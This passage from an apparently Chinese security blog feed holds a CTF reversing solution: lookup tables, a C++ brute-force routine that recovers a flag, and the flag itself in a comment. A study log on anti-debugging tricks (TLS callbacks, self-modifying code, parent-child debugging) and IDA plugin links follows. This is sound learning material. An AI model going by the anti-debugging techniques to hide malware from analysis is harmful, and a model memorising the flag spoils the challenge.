class="number">0xEBCD3882</span>, <span class="number">0x83CE144A</span>, <span class="number">0x3BCB6112</span>, <span class="number">0x53C84DDA</span>,</span><br><span class="line"><span class="number">0x9C5BFAA6</span>, <span class="number">0xF458D66E</span>, <span class="number">0x4C5DA336</span>, <span class="number">0x245E8FFE</span>, <span class="number">0x39BB3F77</span>, <span class="number">0x51B813BF</span>, <span class="number">0xE9BD66E7</span>, <span class="number">0x81BE4A2F</span>,</span><br><span class="line"><span class="number">0xD27607F5</span>, <span class="number">0xBA752B3D</span>, <span class="number">0x02705E65</span>, <span class="number">0x6A7372AD</span>, <span class="number">0x7796C224</span>, <span class="number">0x1F95EEEC</span>, <span class="number">0xA7909BB4</span>, <span class="number">0xCF93B77C</span>,</span><br><span class="line"><span class="number">0x3D5B83BD</span>, <span class="number">0x5558AF75</span>, <span class="number">0xED5DDA2D</span>, <span class="number">0x855EF6E5</span>, <span class="number">0x98BB466C</span>, <span class="number">0xF0B86AA4</span>, <span class="number">0x48BD1FFC</span>, <span class="number">0x20BE3334</span>,</span><br><span class="line"><span class="number">0x73767EEE</span>, <span class="number">0x1B755226</span>, <span class="number">0xA370277E</span>, <span class="number">0xCB730BB6</span>, <span class="number">0xD696BB3F</span>, <span class="number">0xBE9597F7</span>, <span class="number">0x0690E2AF</span>, <span class="number">0x6E93CE67</span>,</span><br><span class="line"><span class="number">0xA100791B</span>, <span class="number">0xC90355D3</span>, <span class="number">0x7106208B</span>, <span class="number">0x19050C43</span>, <span class="number">0x04E0BCCA</span>, <span class="number">0x6CE39002</span>, <span class="number">0xD4E6E55A</span>, <span class="number">0xBCE5C992</span>,</span><br><span class="line"><span class="number">0xEF2D8448</span>, <span class="number">0x872EA880</span>, <span class="number">0x3F2BDDD8</span>, <span class="number">0x5728F110</span>, <span class="number">0x4ACD4199</span>, <span class="number">0x22CE6D51</span>, <span class="number">0x9ACB1809</span>, <span class="number">0xF2C834C1</span>,</span><br><span class="line"><span class="number">0x7AB7077A</span>, <span class="number">0x12B42BB2</span>, <span class="number">0xAAB15EEA</span>, <span class="number">0xC2B27222</span>, <span class="number">0xDF57C2AB</span>, <span class="number">0xB754EE63</span>, <span class="number">0x0F519B3B</span>, <span class="number">0x6752B7F3</span>,</span><br><span class="line"><span class="number">0x349AFA29</span>, <span class="number">0x5C99D6E1</span>, <span class="number">0xE49CA3B9</span>, <span class="number">0x8C9F8F71</span>, <span class="number">0x917A3FF8</span>, <span class="number">0xF9791330</span>, <span class="number">0x417C6668</span>, <span class="number">0x297F4AA0</span>,</span><br><span class="line"><span class="number">0xE6ECFDDC</span>, <span class="number">0x8EEFD114</span>, <span class="number">0x36EAA44C</span>, <span class="number">0x5EE98884</span>, <span class="number">0x430C380D</span>, <span class="number">0x2B0F14C5</span>, <span class="number">0x930A619D</span>, <span class="number">0xFB094D55</span>,</span><br><span class="line"><span class="number">0xA8C1008F</span>, <span class="number">0xC0C22C47</span>, <span class="number">0x78C7591F</span>, <span class="number">0x10C475D7</span>, <span class="number">0x0D21C55E</span>, <span class="number">0x6522E996</span>, <span class="number">0xDD279CCE</span>, <span class="number">0xB524B006</span>,</span><br><span class="line"><span class="number">0x47EC84C7</span>, <span class="number">0x2FEFA80F</span>, <span class="number">0x97EADD57</span>, <span class="number">0xFFE9F19F</span>, <span class="number">0xE20C4116</span>, <span class="number">0x8A0F6DDE</span>, <span class="number">0x320A1886</span>, <span class="number">0x5A09344E</span>,</span><br><span class="line"><span class="number">0x09C17994</span>, <span class="number">0x61C2555C</span>, <span class="number">0xD9C72004</span>, <span class="number">0xB1C40CCC</span>, <span class="number">0xAC21BC45</span>, <span class="number">0xC422908D</span>, <span class="number">0x7C27E5D5</span>, <span class="number">0x1424C91D</span>,</span><br><span class="line"><span class="number">0xDBB77E61</span>, <span class="number">0xB3B452A9</span>, <span class="number">0x0BB127F1</span>, <span class="number">0x63B20B39</span>, <span class="number">0x7E57BBB0</span>, <span class="number">0x16549778</span>, <span class="number">0xAE51E220</span>, <span class="number">0xC652CEE8</span>,</span><br><span class="line"><span class="number">0x959A8332</span>, <span class="number">0xFD99AFFA</span>, <span class="number">0x459CDAA2</span>, <span class="number">0x2D9FF66A</span>, <span class="number">0x307A46E3</span>, <span class="number">0x58796A2B</span>, <span class="number">0xE07C1F73</span>, <span class="number">0x887F33BB</span>,</span><br><span class="line"><span class="number">0xF56E0EF4</span>, <span class="number">0x9D6D223C</span>, <span class="number">0x25685764</span>, <span class="number">0x4D6B7BAC</span>, <span class="number">0x508ECB25</span>, <span class="number">0x388DE7ED</span>, <span class="number">0x808892B5</span>, <span class="number">0xE88BBE7D</span>,</span><br><span class="line"><span class="number">0xBB43F3A7</span>, <span class="number">0xD340DF6F</span>, <span class="number">0x6B45AA37</span>, <span class="number">0x034686FF</span>, <span class="number">0x1EA33676</span>, <span class="number">0x76A01ABE</span>, <span class="number">0xCEA56FE6</span>, <span class="number">0xA6A6432E</span>,</span><br><span class="line"><span class="number">0x6935F452</span>, <span class="number">0x0136D89A</span>, <span class="number">0xB933ADC2</span>, <span class="number">0xD130810A</span>, <span class="number">0xCCD53183</span>, <span class="number">0xA4D61D4B</span>, <span class="number">0x1CD36813</span>, <span class="number">0x74D044DB</span>,</span><br><span class="line"><span class="number">0x27180901</span>, <span class="number">0x4F1B25C9</span>, <span class="number">0xF71E5091</span>, <span class="number">0x9F1D7C59</span>, <span class="number">0x82F8CCD0</span>, <span class="number">0xEAFBE018</span>, <span class="number">0x52FE9540</span>, <span class="number">0x3AFDB988</span>,</span><br><span class="line"><span class="number">0xC8358D49</span>, <span class="number">0xA036A181</span>, <span class="number">0x1833D4D9</span>, <span class="number">0x7030F811</span>, <span class="number">0x6DD54898</span>, <span class="number">0x05D66450</span>, <span class="number">0xBDD31108</span>, <span class="number">0xD5D03DC0</span>,</span><br><span class="line"><span class="number">0x8618701A</span>, <span class="number">0xEE1B5CD2</span>, <span class="number">0x561E298A</span>, <span class="number">0x3E1D0542</span>, <span class="number">0x23F8B5CB</span>, <span class="number">0x4BFB9903</span>, <span class="number">0xF3FEEC5B</span>, <span class="number">0x9BFDC093</span>,</span><br><span class="line"><span class="number">0x546E77EF</span>, <span class="number">0x3C6D5B27</span>, <span class="number">0x84682E7F</span>, <span class="number">0xEC6B02B7</span>, <span class="number">0xF18EB23E</span>, <span class="number">0x998D9EF6</span>, <span class="number">0x2188EBAE</span>, <span class="number">0x498BC766</span>,</span><br><span class="line"><span class="number">0x1A438ABC</span>, <span class="number">0x7240A674</span>, <span class="number">0xCA45D32C</span>, <span class="number">0xA246FFE4</span>, <span class="number">0xBFA34F6D</span>, <span class="number">0xD7A063A5</span>, <span class="number">0x6FA516FD</span>, <span class="number">0x07A63A35</span>,</span><br><span class="line"><span class="number">0x8FD9098E</span>, <span class="number">0xE7DA2546</span>, <span class="number">0x5FDF501E</span>, <span class="number">0x37DC7CD6</span>, <span class="number">0x2A39CC5F</span>, <span class="number">0x423AE097</span>, <span class="number">0xFA3F95CF</span>, <span class="number">0x923CB907</span>,</span><br><span class="line"><span class="number">0xC1F4F4DD</span>, <span class="number">0xA9F7D815</span>, <span class="number">0x11F2AD4D</span>, <span class="number">0x79F18185</span>, <span class="number">0x6414310C</span>, <span class="number">0x0C171DC4</span>, <span class="number">0xB412689C</span>, <span class="number">0xDC114454</span>,</span><br><span class="line"><span class="number">0x1382F328</span>, <span class="number">0x7B81DFE0</span>, <span class="number">0xC384AAB8</span>, <span class="number">0xAB878670</span>, <span class="number">0xB66236F9</span>, <span class="number">0xDE611A31</span>, <span class="number">0x66646F69</span>, <span class="number">0x0E6743A1</span>,</span><br><span class="line"><span class="number">0x5DAF0E7B</span>, <span class="number">0x35AC22B3</span>, <span class="number">0x8DA957EB</span>, <span class="number">0xE5AA7B23</span>, <span class="number">0xF84FCBAA</span>, <span class="number">0x904CE762</span>, <span class="number">0x2849923A</span>, <span class="number">0x404ABEF2</span>,</span><br><span class="line"><span class="number">0xB2828A33</span>, <span class="number">0xDA81A6FB</span>, <span class="number">0x6284D3A3</span>, <span class="number">0x0A87FF6B</span>, <span class="number">0x17624FE2</span>, <span class="number">0x7F61632A</span>, <span class="number">0xC7641672</span>, <span class="number">0xAF673ABA</span>,</span><br><span class="line"><span class="number">0xFCAF7760</span>, <span class="number">0x94AC5BA8</span>, <span class="number">0x2CA92EF0</span>, <span class="number">0x44AA0238</span>, <span class="number">0x594FB2B1</span>, <span class="number">0x314C9E79</span>, <span class="number">0x8949EB21</span>, <span class="number">0xE14AC7E9</span>,</span><br><span class="line"><span class="number">0x2ED97095</span>, <span class="number">0x46DA5C5D</span>, <span class="number">0xFEDF2905</span>, <span class="number">0x96DC05CD</span>, <span class="number">0x8B39B544</span>, <span class="number">0xE33A998C</span>, <span class="number">0x5B3FECD4</span>, <span class="number">0x333CC01C</span>,</span><br><span class="line"><span class="number">0x60F48DC6</span>, <span class="number">0x08F7A10E</span>, <span class="number">0xB0F2D456</span>, <span class="number">0xD8F1F89E</span>, <span class="number">0xC5144817</span>, <span class="number">0xAD1764DF</span>, <span class="number">0x15121187</span>, <span class="number">0x7D113D4F</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x493C7D27</span>, <span class="number">0x9278FA4E</span>, <span class="number">0xDB448769</span>, <span class="number">0x211D826D</span>, <span class="number">0x6821FF4A</span>, <span class="number">0xB3657823</span>, <span class="number">0xFA590504</span>,</span><br><span class="line"><span class="number">0x423B04DA</span>, <span class="number">0x0B0779FD</span>, <span class="number">0xD043FE94</span>, <span class="number">0x997F83B3</span>, <span class="number">0x632686B7</span>, <span class="number">0x2A1AFB90</span>, <span class="number">0xF15E7CF9</span>, <span class="number">0xB86201DE</span>,</span><br><span class="line"><span class="number">0x847609B4</span>, <span class="number">0xCD4A7493</span>, <span class="number">0x160EF3FA</span>, <span class="number">0x5F328EDD</span>, <span class="number">0xA56B8BD9</span>, <span class="number">0xEC57F6FE</span>, <span class="number">0x37137197</span>, <span class="number">0x7E2F0CB0</span>,</span><br><span class="line"><span class="number">0xC64D0D6E</span>, <span class="number">0x8F717049</span>, <span class="number">0x5435F720</span>, <span class="number">0x1D098A07</span>, <span class="number">0xE7508F03</span>, <span class="number">0xAE6CF224</span>, <span class="number">0x7528754D</span>, <span class="number">0x3C14086A</span>,</span><br><span class="line"><span class="number">0x0D006599</span>, <span class="number">0x443C18BE</span>, <span class="number">0x9F789FD7</span>, <span class="number">0xD644E2F0</span>, <span class="number">0x2C1DE7F4</span>, <span class="number">0x65219AD3</span>, <span class="number">0xBE651DBA</span>, <span class="number">0xF759609D</span>,</span><br><span class="line"><span class="number">0x4F3B6143</span>, <span class="number">0x06071C64</span>, <span class="number">0xDD439B0D</span>, <span class="number">0x947FE62A</span>, <span class="number">0x6E26E32E</span>, <span class="number">0x271A9E09</span>, <span class="number">0xFC5E1960</span>, <span class="number">0xB5626447</span>,</span><br><span class="line"><span class="number">0x89766C2D</span>, <span class="number">0xC04A110A</span>, <span class="number">0x1B0E9663</span>, <span class="number">0x5232EB44</span>, <span class="number">0xA86BEE40</span>, <span class="number">0xE1579367</span>, <span class="number">0x3A13140E</span>, <span class="number">0x732F6929</span>,</span><br><span class="line"><span class="number">0xCB4D68F7</span>, <span class="number">0x827115D0</span>, <span class="number">0x593592B9</span>, <span class="number">0x1009EF9E</span>, <span class="number">0xEA50EA9A</span>, <span class="number">0xA36C97BD</span>, <span class="number">0x782810D4</span>, <span class="number">0x31146DF3</span>,</span><br><span class="line"><span class="number">0x1A00CB32</span>, <span class="number">0x533CB615</span>, <span class="number">0x8878317C</span>, <span class="number">0xC1444C5B</span>, <span class="number">0x3B1D495F</span>, <span class="number">0x72213478</span>, <span class="number">0xA965B311</span>, <span class="number">0xE059CE36</span>,</span><br><span class="line"><span class="number">0x583BCFE8</span>, <span class="number">0x1107B2CF</span>, <span class="number">0xCA4335A6</span>, <span class="number">0x837F4881</span>, <span class="number">0x79264D85</span>, <span class="number">0x301A30A2</span>, <span class="number">0xEB5EB7CB</span>, <span class="number">0xA262CAEC</span>,</span><br><span class="line"><span class="number">0x9E76C286</span>, <span class="number">0xD74ABFA1</span>, <span class="number">0x0C0E38C8</span>, <span class="number">0x453245EF</span>, <span class="number">0xBF6B40EB</span>, <span class="number">0xF6573DCC</span>, <span class="number">0x2D13BAA5</span>, <span class="number">0x642FC782</span>,</span><br><span class="line"><span class="number">0xDC4DC65C</span>, <span class="number">0x9571BB7B</span>, <span class="number">0x4E353C12</span>, <span class="number">0x07094135</span>, <span class="number">0xFD504431</span>, <span class="number">0xB46C3916</span>, <span class="number">0x6F28BE7F</span>, <span class="number">0x2614C358</span>,</span><br><span class="line"><span class="number">0x1700AEAB</span>, <span class="number">0x5E3CD38C</span>, <span class="number">0x857854E5</span>, <span class="number">0xCC4429C2</span>, <span class="number">0x361D2CC6</span>, <span class="number">0x7F2151E1</span>, <span class="number">0xA465D688</span>, <span class="number">0xED59ABAF</span>,</span><br><span class="line"><span class="number">0x553BAA71</span>, <span class="number">0x1C07D756</span>, <span class="number">0xC743503F</span>, <span class="number">0x8E7F2D18</span>, <span class="number">0x7426281C</span>, <span class="number">0x3D1A553B</span>, <span class="number">0xE65ED252</span>, <span class="number">0xAF62AF75</span>,</span><br><span class="line"><span class="number">0x9376A71F</span>, <span class="number">0xDA4ADA38</span>, <span class="number">0x010E5D51</span>, <span class="number">0x48322076</span>, <span class="number">0xB26B2572</span>, <span class="number">0xFB575855</span>, <span class="number">0x2013DF3C</span>, <span class="number">0x692FA21B</span>,</span><br><span class="line"><span class="number">0xD14DA3C5</span>, <span class="number">0x9871DEE2</span>, <span class="number">0x4335598B</span>, <span class="number">0x0A0924AC</span>, <span class="number">0xF05021A8</span>, <span class="number">0xB96C5C8F</span>, <span class="number">0x6228DBE6</span>, <span class="number">0x2B14A6C1</span>,</span><br><span class="line"><span class="number">0x34019664</span>, <span class="number">0x7D3DEB43</span>, <span class="number">0xA6796C2A</span>, <span class="number">0xEF45110D</span>, <span class="number">0x151C1409</span>, <span class="number">0x5C20692E</span>, <span class="number">0x8764EE47</span>, <span class="number">0xCE589360</span>,</span><br><span class="line"><span class="number">0x763A92BE</span>, <span class="number">0x3F06EF99</span>, <span class="number">0xE44268F0</span>, <span class="number">0xAD7E15D7</span>, <span class="number">0x572710D3</span>, <span class="number">0x1E1B6DF4</span>, <span class="number">0xC55FEA9D</span>, <span class="number">0x8C6397BA</span>,</span><br><span class="line"><span class="number">0xB0779FD0</span>, <span class="number">0xF94BE2F7</span>, <span class="number">0x220F659E</span>, <span class="number">0x6B3318B9</span>, <span class="number">0x916A1DBD</span>, <span class="number">0xD856609A</span>, <span class="number">0x0312E7F3</span>, <span class="number">0x4A2E9AD4</span>,</span><br><span class="line"><span class="number">0xF24C9B0A</span>, <span class="number">0xBB70E62D</span>, <span class="number">0x60346144</span>, <span class="number">0x29081C63</span>, <span class="number">0xD3511967</span>, <span class="number">0x9A6D6440</span>, <span class="number">0x4129E329</span>, <span class="number">0x08159E0E</span>,</span><br><span class="line"><span class="number">0x3901F3FD</span>, <span class="number">0x703D8EDA</span>, <span class="number">0xAB7909B3</span>, <span class="number">0xE2457494</span>, <span class="number">0x181C7190</span>, <span class="number">0x51200CB7</span>, <span class="number">0x8A648BDE</span>, <span class="number">0xC358F6F9</span>,</span><br><span class="line"><span class="number">0x7B3AF727</span>, <span class="number">0x32068A00</span>, <span class="number">0xE9420D69</span>, <span class="number">0xA07E704E</span>, <span class="number">0x5A27754A</span>, <span class="number">0x131B086D</span>, <span class="number">0xC85F8F04</span>, <span class="number">0x8163F223</span>,</span><br><span class="line"><span class="number">0xBD77FA49</span>, <span class="number">0xF44B876E</span>, <span class="number">0x2F0F0007</span>, <span class="number">0x66337D20</span>, <span class="number">0x9C6A7824</span>, <span class="number">0xD5560503</span>, <span class="number">0x0E12826A</span>, <span class="number">0x472EFF4D</span>,</span><br><span class="line"><span class="number">0xFF4CFE93</span>, <span class="number">0xB67083B4</span>, <span class="number">0x6D3404DD</span>, <span class="number">0x240879FA</span>, <span class="number">0xDE517CFE</span>, <span class="number">0x976D01D9</span>, <span class="number">0x4C2986B0</span>, <span class="number">0x0515FB97</span>,</span><br><span class="line"><span class="number">0x2E015D56</span>, <span class="number">0x673D2071</span>, <span class="number">0xBC79A718</span>, <span class="number">0xF545DA3F</span>, <span class="number">0x0F1CDF3B</span>, <span class="number">0x4620A21C</span>, <span class="number">0x9D642575</span>, <span class="number">0xD4585852</span>,</span><br><span class="line"><span class="number">0x6C3A598C</span>, <span class="number">0x250624AB</span>, <span class="number">0xFE42A3C2</span>, <span class="number">0xB77EDEE5</span>, <span class="number">0x4D27DBE1</span>, <span class="number">0x041BA6C6</span>, <span class="number">0xDF5F21AF</span>, <span class="number">0x96635C88</span>,</span><br><span class="line"><span class="number">0xAA7754E2</span>, <span class="number">0xE34B29C5</span>, <span class="number">0x380FAEAC</span>, <span class="number">0x7133D38B</span>, <span class="number">0x8B6AD68F</span>, <span class="number">0xC256ABA8</span>, <span class="number">0x19122CC1</span>, <span class="number">0x502E51E6</span>,</span><br><span class="line"><span class="number">0xE84C5038</span>, <span class="number">0xA1702D1F</span>, <span class="number">0x7A34AA76</span>, <span class="number">0x3308D751</span>, <span class="number">0xC951D255</span>, <span class="number">0x806DAF72</span>, <span class="number">0x5B29281B</span>, <span class="number">0x1215553C</span>,</span><br><span class="line"><span class="number">0x230138CF</span>, <span class="number">0x6A3D45E8</span>, <span class="number">0xB179C281</span>, <span class="number">0xF845BFA6</span>, <span class="number">0x021CBAA2</span>, <span class="number">0x4B20C785</span>, <span class="number">0x906440EC</span>, <span class="number">0xD9583DCB</span>,</span><br><span class="line"><span class="number">0x613A3C15</span>, <span class="number">0x28064132</span>, <span class="number">0xF342C65B</span>, <span class="number">0xBA7EBB7C</span>, <span class="number">0x4027BE78</span>, <span class="number">0x091BC35F</span>, <span class="number">0xD25F4436</span>, <span class="number">0x9B633911</span>,</span><br><span class="line"><span class="number">0xA777317B</span>, <span class="number">0xEE4B4C5C</span>, <span class="number">0x350FCB35</span>, <span class="number">0x7C33B612</span>, <span class="number">0x866AB316</span>, <span class="number">0xCF56CE31</span>, <span class="number">0x14124958</span>, <span class="number">0x5D2E347F</span>,</span><br><span class="line"><span class="number">0xE54C35A1</span>, <span class="number">0xAC704886</span>, <span class="number">0x7734CFEF</span>, <span class="number">0x3E08B2C8</span>, <span class="number">0xC451B7CC</span>, <span class="number">0x8D6DCAEB</span>, <span class="number">0x56294D82</span>, <span class="number">0x1F1530A5</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t2[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0xDC</span>, <span class="number">0x53</span>, <span class="number">0xF5</span>, <span class="number">0x95</span>, <span class="number">0x23</span>, <span class="number">0x4E</span>, <span class="number">0x3B</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0x0B</span>, <span class="number">0x82</span>, <span class="number">0x45</span>, <span class="number">0x9E</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x1B</span>, <span class="number">0x62</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x7F</span>, <span class="number">0x88</span>, <span class="number">0x86</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xA0</span>, <span class="number">0xDE</span>, <span class="number">0x26</span>, <span class="number">0xAA</span>, <span class="number">0x4C</span>, <span class="number">0x04</span>, <span class="number">0x87</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v17; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> m, n, j = <span class="number">0</span>, k = <span class="number">0</span>, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mid;</span><br><span class="line"><span class="type">unsigned</span> sk;</span><br><span class="line">std::string hexChars = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line"><span class="function">std::string <span class="title">input</span><span class="params">(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>)</span></span>;</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">m = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> tt = <span class="number">0</span>; tt &lt; <span class="number">8</span>; tt++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c1 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c2 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c3 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c4 : hexChars) &#123;</span><br><span class="line">input[<span class="number">0</span>] = c1;</span><br><span class="line">input[<span class="number">1</span>] = c2;</span><br><span class="line">input[<span class="number">2</span>] = c3;</span><br><span class="line">input[<span class="number">3</span>] = c4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">sk = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v12 = (sk | ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j)) &amp; ~(sk &amp; ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j));</span><br><span class="line">v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line"><span class="keyword">if</span> (((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; c1 &lt;&lt; c2 &lt;&lt; c3 &lt;&lt; c4;</span><br><span class="line">m += <span class="number">4</span>;</span><br><span class="line">n += <span class="number">256</span>;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">B:;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;b19777392bfa99f1cb695279e8b6851e&#125;</span></span><br></pre></td></tr></table></figure><hr><p>这两周在上课，导致一直在摆烂</p><p>然后主要学了一点TLS的内容和SMC还有父子进程调试还有web的一些入门</p><h2 id="TLS">TLS</h2><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">【原创】反调试实战系列二 TLS反调试+CheckRemoteDebuggerPresent原理 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p>这篇很详细，直接看就好了</p><p>值得注意的是TLS不仅有函数还有全局变量，大致写在下面</p><p><a href="https://www.pri87.vip/posts/95e9e72b.html">TLS相关研究</a></p><h2 id="SMC">SMC</h2><p>其实就是动态地解密代码，动态patch，和hook差不多，但是还是感觉hook方便一点。需要注意尽量不要修改需要重定位的地方，在修改完地址和栈的情况下，地址会错乱，栈指针的偏移量会爆红</p><p>之后我想一个好一点的方法（感觉还是改key或者数组的值好）</p><h2 id="父子进程反调试">父子进程反调试</h2><p><a href="https://www.pri87.vip/posts/3f67770.html">父子进程反调试</a></p><h2 id="杂项">杂项</h2><h3 id="ida插件编写相关文章">ida插件编写相关文章</h3><p><a href="https://bbs.kanxue.com/thread-38900.htm">IDA Plugin 编写基础-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-226983.htm">原创]用IDAPython实现的反反调试小脚本-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-63160.htm">翻译]《IDA pro plugin writing in C/C++》[2008-07-28第二次更新]-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5/releases/tag/0.2">Release ScyllaHide-IDA7.5 · notify-bibi/ScyllaHide-IDA7.5 · GitHub</a></p><h3 id="web入门">web入门</h3><p><a href="https://www.pri87.vip/posts/f3edc96d.html">web入门</a></p><h3 id="elf文件结构">elf文件结构</h3><p><a href="https://www.pri87.vip/posts/e60119a.html">ELF文件结构</a></p><h3 id="pyc与花指令">pyc与花指令</h3><p><a href="https://www.pri87.vip/posts/96b00b8.html">pyc与花指令</a></p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 放假 </tag>
            
            <tag> 开摆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyc与花指令</title>
      <link href="/posts/96b00b8.html"/>
      <url>/posts/96b00b8.html</url>
      
